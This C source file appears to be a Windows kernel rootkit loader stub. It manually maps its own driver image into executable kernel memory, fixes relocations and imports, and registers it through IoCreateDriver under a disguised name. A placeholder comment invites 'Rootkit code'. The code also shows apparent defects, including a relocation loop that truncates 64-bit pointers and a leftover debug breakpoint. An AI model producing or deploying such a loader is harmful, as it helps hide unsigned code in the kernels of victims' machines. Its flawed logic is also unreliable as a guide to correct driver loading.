#include "stub.h"
#include <intrin.h>
#include <ntimage.h>

#pragma comment(linker, "/include:?Bootstrap@@YAJPEAX@Z") //Don't let linker optimize this out!
#define DRIVER_NAME L"\\FileSystem\\bsideshide"

NTSTATUS Bootstrap(PVOID arg)
{
	LDRFUNCS ft;
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	PVOID hDriver = NULL;

	DECLARE_CONST_UNICODE_STRING(drvName, DRIVER_NAME);
	DECLARE_CONST_UNICODE_STRING(uExAllocatePoolWithTag, L"ExAllocatePoolWithTag");
	DECLARE_CONST_UNICODE_STRING(uExFreePoolWithTag, L"ExFreePoolWithTag");
	DECLARE_CONST_UNICODE_STRING(uIoCreateDriver, L"IoCreateDriver");
	DECLARE_CONST_UNICODE_STRING(uRtlImageDirectoryEntryToData, L"RtlImageDirectoryEntryToData");
	DECLARE_CONST_UNICODE_STRING(uRtlImageNtHeader, L"RtlImageNtHeader");
	DECLARE_CONST_UNICODE_STRING(uRtlQueryModuleInformation, L"RtlQueryModuleInformation");

	ft.MmGetSystemRoutineAddress = (MMGETSYSTEMROUTINEADDRESS)arg;
	if (NULL != ft.MmGetSystemRoutineAddress) {
		ft.ExAllocatePoolWithTag = (EXALLOCATEPOOLWITHTAG)ft.MmGetSystemRoutineAddress((PUNICODE_STRING)&uExAllocatePoolWithTag);
		if (NULL != ft.ExAllocatePoolWithTag) {
			ft.ExFreePoolWithTag = (EXFREEPOOLWITHTAG)ft.MmGetSystemRoutineAddress((PUNICODE_STRING)&uExFreePoolWithTag);
			if (NULL != ft.ExFreePoolWithTag) {
				ft.IoCreateDriver = (IOCREATEDRIVER)ft.MmGetSystemRoutineAddress((PUNICODE_STRING)&uIoCreateDriver);
				if (NULL != ft.IoCreateDriver) {
					ft.RtlImageDirectoryEntryToData = (RTLIMAGEDIRECTORYENTRYTODATA)ft.MmGetSystemRoutineAddress((PUNICODE_STRING)&uRtlImageDirectoryEntryToData);
					if (NULL != ft.RtlImageDirectoryEntryToData) {
						ft.RtlImageNtHeader = (RTLIMAGENTHEADER)ft.MmGetSystemRoutineAddress((PUNICODE_STRING)&uRtlImageNtHeader);
						if (NULL != ft.RtlImageNtHeader) {
							ft.RtlQueryModuleInformation = (RTLQUERYMODULEINFORMATION)ft.MmGetSystemRoutineAddress((PUNICODE_STRING)&uRtlQueryModuleInformation);
							if (NULL != ft.RtlQueryModuleInformation) {
								PVOID pBase = (PUCHAR)Bootstrap - 0x400;
								PIMAGE_NT_HEADERS pNTHdr = ft.RtlImageNtHeader(pBase);
								if (pNTHdr) {
									hDriver = ft.ExAllocatePoolWithTag(NonPagedPoolExecute, pNTHdr->OptionalHeader.SizeOfImage, TAG);
									if (hDriver) {
										PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNTHdr);
										__movsq((PULONG64)hDriver, (PULONG64)pBase, pNTHdr->OptionalHeader.SizeOfHeaders / sizeof(__int64));
										for (ULONG i = 0; i < pNTHdr->FileHeader.NumberOfSections; ++i)
											__movsq((PULONG64)CONVERT_RVA(hDriver, pSection[i].VirtualAddress), (PULONG64)CONVERT_RVA(pBase, pSection[i].PointerToRawData), pSection[i].SizeOfRawData / sizeof(__int64));
										if NT_SUCCESS(DoRelocation(&ft, hDriver)) {
											if NT_SUCCESS(FindImports(&ft, hDriver)){
												PDRIVER_INITIALIZE DriverEntry = (PDRIVER_INITIALIZE)CONVERT_RVA(hDriver, pNTHdr->OptionalHeader.AddressOfEntryPoint);
												status = ft.IoCreateDriver((PUNICODE_STRING)&drvName, DriverEntry);
											}
										}
										if (!NT_SUCCESS(status)) ft.ExFreePoolWithTag(hDriver, TAG);
									}
								}
							}
						}
					}
				}
			}
		}
	}
	return status;
}

NTSTATUS FindImports(PLDRFUNCS ft, PVOID hDriver)
{
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	ULONG size;
	PIMAGE_IMPORT_DESCRIPTOR pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)ft->RtlImageDirectoryEntryToData(hDriver, TRUE, IMAGE_DIRECTORY_ENTRY_IMPORT, &size);
	if (pImportDesc)
	{
		for (; pImportDesc->Name; pImportDesc++)
		{
			LPSTR libName = (LPSTR)CONVERT_RVA(hDriver, pImportDesc->Name);
			PVOID hModule = GetModuleByName(ft, libName);
			if (hModule) {
				PIMAGE_THUNK_DATA pNames = (PIMAGE_THUNK_DATA)CONVERT_RVA(hDriver, pImportDesc->OriginalFirstThunk);
				PIMAGE_THUNK_DATA pFuncP = (PIMAGE_THUNK_DATA)CONVERT_RVA(hDriver, pImportDesc->FirstThunk);

				for (; pNames->u1.ForwarderString; ++pNames, ++pFuncP)
				{
					PIMAGE_IMPORT_BY_NAME pIName = (PIMAGE_IMPORT_BY_NAME)CONVERT_RVA(hDriver, pNames->u1.AddressOfData);
					PVOID func = GetRoutineByName(ft, hModule, pIName->Name);
					if (func)
						pFuncP->u1.Function = (ULONGLONG)func;
					else return STATUS_PROCEDURE_NOT_FOUND;
				}
			}
			else return STATUS_DRIVER_UNABLE_TO_LOAD;
		}
		status = STATUS_SUCCESS;
	}
	return status;
}

NTSTATUS DoRelocation(PLDRFUNCS ft, PVOID hDriver)
{
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	ULONG size;
	PIMAGE_NT_HEADERS pNTHdr = ft->RtlImageNtHeader(hDriver);
	ULONGLONG delta = (ULONGLONG)hDriver - pNTHdr->OptionalHeader.ImageBase;
	PIMAGE_BASE_RELOCATION pRel = (PIMAGE_BASE_RELOCATION)ft->RtlImageDirectoryEntryToData(hDriver, TRUE, IMAGE_DIRECTORY_ENTRY_BASERELOC, &size);
	if (pRel) {
		size = pNTHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
		for (ULONG i = 0; i < size; i += pRel->SizeOfBlock, pRel = (PIMAGE_BASE_RELOCATION)((ULONG)pRel + i))
		{
			for (PUSHORT chains = (PUSHORT)((ULONGLONG)pRel + sizeof(IMAGE_BASE_RELOCATION)); chains < (PUSHORT)((ULONGLONG)pRel + pRel->SizeOfBlock); ++chains)
			{
				switch (*chains >> 12)
				{
				case IMAGE_REL_BASED_ABSOLUTE:
					break;
				case IMAGE_REL_BASED_HIGHLOW:
					*(PULONG)CONVERT_RVA(hDriver, pRel->VirtualAddress + (*chains & 0x0fff)) += (ULONG)delta;
					break;
				case IMAGE_REL_BASED_DIR64:
					*(PULONGLONG)CONVERT_RVA(hDriver, pRel->VirtualAddress + (*chains & 0x0fff)) += delta;
					break;
				default:
					return STATUS_NOT_IMPLEMENTED;
				}
			}
		}
		status = STATUS_SUCCESS;
	}
	return status;
}

PVOID GetRoutineByName(PLDRFUNCS ft, PVOID hDriver, LPCSTR FunctionName)
{
	ULONG dirSize;
	PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)ft->RtlImageDirectoryEntryToData(hDriver, true, IMAGE_DIRECTORY_ENTRY_EXPORT, &dirSize);
	PULONG names = (PULONG)CONVERT_RVA(hDriver, pExportDir->AddressOfNames);
	PUSHORT ordinals = (PUSHORT)CONVERT_RVA(hDriver, pExportDir->AddressOfNameOrdinals);
	PULONG functions = (PULONG)CONVERT_RVA(hDriver, pExportDir->AddressOfFunctions);
	for (ULONG i = 0; i < pExportDir->NumberOfNames; ++i)
	{
		LPCSTR name = (LPCSTR)CONVERT_RVA(hDriver, names[i]);
		if (0 == strcmp(FunctionName, name))
		{
			return CONVERT_RVA(hDriver, functions[ordinals[i]]);
		}
	}
	return NULL;
}

//Not an accurate stricmp! Works fine for our needs
inline BOOLEAN xstricmp(LPCSTR s1, LPCSTR s2) {
	for (ULONG i = 0; 0==((s1[i] ^ s2[i]) & 0xDF); ++i)
		if (0 == s1[i]) return TRUE;
	return FALSE;
}

PVOID GetModuleByName(PLDRFUNCS ft, LPCSTR driverName)
{
	ULONG size = 0;
	PVOID ImageBase = NULL;
	__debugbreak();
	NTSTATUS status = ft->RtlQueryModuleInformation(&size, sizeof(RTL_MODULE_EXTENDED_INFO), NULL);
	if NT_SUCCESS(status) {
		PRTL_MODULE_EXTENDED_INFO pDrivers = (PRTL_MODULE_EXTENDED_INFO)ft->ExAllocatePoolWithTag(PagedPool, size, TAG);
		if (pDrivers) {
			status = ft->RtlQueryModuleInformation(&size, sizeof(RTL_MODULE_EXTENDED_INFO), pDrivers);
			if NT_SUCCESS(status) {
				for (ULONG i = 0; i < size / sizeof(RTL_MODULE_EXTENDED_INFO); ++i) {
					if (xstricmp(driverName, &pDrivers[i].FullPathName[pDrivers[i].FileNameOffset])) {
						ImageBase = pDrivers[i].ImageBase;
						break;
					}
				}
			}
			ft->ExFreePoolWithTag(pDrivers, TAG);
		}
	}
	return ImageBase;
}


NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
{
	NTSTATUS status = STATUS_SUCCESS;
	UNREFERENCED_PARAMETER(RegistryPath);
	UNREFERENCED_PARAMETER(DriverObject);

	//TODO: Enter Rootkit code here

	return status;
}
